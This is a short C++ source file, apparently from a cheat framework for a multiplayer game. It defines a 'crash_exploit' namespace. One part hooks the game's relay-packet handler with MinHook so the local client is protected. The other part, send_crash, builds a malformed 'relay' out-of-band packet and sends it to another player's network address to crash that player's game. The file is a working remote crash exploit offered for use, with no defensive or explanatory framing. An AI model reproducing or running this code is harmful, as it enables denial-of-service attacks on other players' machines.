//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

namespace crash_exploit
{
	int atol_CL_HandleRelayPacket(const char* str)
	{
		if (_ReturnAddress() == (LPVOID)t6::offsets::atol_CL_HandleRelayPacketRet)
			return min(t6::atol_CL_HandleRelayPacket(str), 17ul);

		return t6::atol_CL_HandleRelayPacket(str);
	}
	/*
	//=====================================================================================
	*/
	void init()
	{
		MH_Initialize();

		MH_CreateHook((LPVOID)t6::offsets::atol_CL_HandleRelayPacket, atol_CL_HandleRelayPacket, (LPVOID*)&t6::atol_CL_HandleRelayPacket);
		MH_EnableHook((LPVOID)t6::offsets::atol_CL_HandleRelayPacket);
	}
	/*
	//=====================================================================================
	*/
	void free()
	{
		MH_DisableHook((LPVOID)t6::offsets::atol_CL_HandleRelayPacket);
		MH_RemoveHook((LPVOID)t6::offsets::atol_CL_HandleRelayPacket);

		MH_Uninitialize();
	}
	/*
	//=====================================================================================
	*/
	void send_crash(int client_num)
	{
		char buf[2048];

		msg_t msg;
		t6::MSG_Init(&msg, buf, sizeof buf);
		t6::MSG_WriteString(&msg, "relay 1 1234567890");

		netadr_s netadr;
		NeoGenesys::GetPlayerAddr((NeoGenesys::sNetAddr*)&netadr, (SessionData*)NeoGenesys::GetCurrentSession(), client_num);
		t6::NET_OutOfBandData(netsrc_t::NS_CLIENT1, netadr, msg.data, msg.cursize);
	}
	/*
	//=====================================================================================
	*/
	bool send_connectivity_test(int client_num)
	{
		if (const auto our_client_num = t6::Party_FindMemberByXUID((SessionData*)NeoGenesys::GetCurrentSession(), t6::Live_GetXuid((ControllerIndex_t)0)); our_client_num >= 0)
		{
			char buf[2048];
			msg_t msg;

			t6::MSG_Init(&msg, buf, sizeof buf);
			t6::MSG_WriteString(&msg, "vt");
			t6::MSG_WriteByte(&msg, our_client_num);
			t6::CL_SendPeerData((SessionData*)NeoGenesys::GetCurrentSession(), 0, netsrc_t::NS_CLIENT1, client_num, &msg, 1);

			return t6::CL_CanWeConnectToClient((SessionData*)NeoGenesys::GetCurrentSession(), our_client_num, client_num);
		}

		return false;
	}
}

//=====================================================================================